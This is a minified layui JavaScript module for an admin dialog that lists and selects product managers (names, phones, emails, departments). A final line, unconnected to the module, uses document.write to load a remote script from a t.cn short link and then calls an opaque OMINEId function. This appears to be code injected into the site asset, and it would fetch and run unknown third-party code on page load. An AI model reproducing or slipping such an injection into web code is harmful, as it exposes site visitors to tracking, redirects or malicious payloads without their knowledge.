"use strict";layui.define(["layer","table","form","laypage"],function(e){var c,n,o=layui.layer,t=layui.table,i=layui.form,a=layui.laypage,r=function(e,t){$.get("/Admin/Sysuser/productLiablePersionList",e,function(e){0===(e=$.parseJSON(e)).error?(c=e.data,t(e.data)):o.tips(e.msg,".modal-search-btn")})},d=function(e){t.render({elem:".select-modal-table",data:e.list,page:!1,limit:e.pageSize,cellMinWidth:160,height:"360",cols:[[{field:"checkbox",width:50,fixed:"left",templet:'<div><input class="select-modal-checkbox" lay-filter="c_check" type="checkbox" name="" lay-skin="primary"></div>'},{field:"uid",title:"编号"},{field:"femplname",title:"产品负责人"},{field:"mobile",title:"电话"},{field:"email",title:"邮箱"},{field:"department_name",title:"部门",templet:function(e){return e.departmentInfo?e.departmentInfo.department_name:""}}]]}),i.on("checkbox(c_check)",function(e){var t=$(".select-modal-checkbox");n?$(e.elem).prop("checked")?$(e.elem).prop("checked",!0):$(e.elem).prop("checked",!1):(t.prop("checked",!1),$(e.elem).prop("checked",!0)),i.render("checkbox")})};e("selectPm",{start:function(l){o.open({title:"选择产品负责人",type:0,area:["640px","535px"],content:'<div class="select-modal-container"> <div class="select-modal-box"> <table lay-filter="select-modal-table" class="select-modal-table"></table> <div class="select-modal-page"></div> </div> </div>',success:function(){r({},function(e){var i;d(e),i=e,a.render({elem:$(".layui-layer-content").find(".select-modal-page")[0],limit:i.pageSize,count:i.count,curr:i.page,layout:["prev","page","next"],jump:function(e,t){t||r({page:e.curr,pageSize:i.pageSize},function(e){d(e)})}})})},yes:function(e,t){var i=$(".layui-layer-content .select-modal-checkbox:checked");if(i.length){var a=[];i.each(function(){var e;e=$(this).parent().parent().parent().index(),a.push(c.list[e])}),l(a),o.close(e)}else o.tips("请勾选需要操作的数据",".layui-layer-btn0")}})},initInput:function(e,i,a,t){var l=this;e=e||".jl-select-pm",a=a||"uid",(n=t)&&l.start(function(e){t.attr("data-val",JSON.stringify(e)),setTimeout(function(){i&&i(e)},10)}),$(e).click(function(){var t=$(this);l.start(function(e){e=e[0];t.val(e[a]),t.data("id",e.id),t.siblings("input")&&t.siblings("input").val(e.uid),i&&i(e,t)})})}})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
